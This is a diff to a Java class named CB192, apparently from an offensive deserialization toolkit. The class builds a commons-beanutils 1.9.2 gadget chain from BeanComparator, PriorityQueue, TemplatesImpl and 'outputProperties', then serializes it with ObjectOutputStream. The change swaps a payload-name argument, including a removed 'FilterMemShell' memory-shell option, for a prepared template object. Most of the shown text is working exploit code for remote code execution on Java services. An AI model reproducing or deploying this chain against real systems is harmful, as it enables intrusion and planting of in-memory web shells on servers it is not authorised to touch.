@@ -6,15 +6,8 @@ import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.PriorityQueue;
 
-@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
 public class CB192 {
-    public static byte[] CBWithoutCC(String payload) throws Exception {
-
-        if (payload == "FilterMemShell") {
-            payload = "DefineClass";
-        }
-
-        Object templates = Gadgets.createTemplatesImpl(payload);
+    public static byte[] CBWithoutCC(Object template) throws Exception {
 
         BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
 
@@ -25,8 +18,8 @@ public class CB192 {
         Gadgets.setFieldValue(comparator, "property", "outputProperties");
 
         Object[] queueArray = (Object[]) Gadgets.getFieldValue(queue, "queue");
-        queueArray[0] = templates;
-        queueArray[1] = templates;
+        queueArray[0] = template;
+        queueArray[1] = template;
 
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(barr);
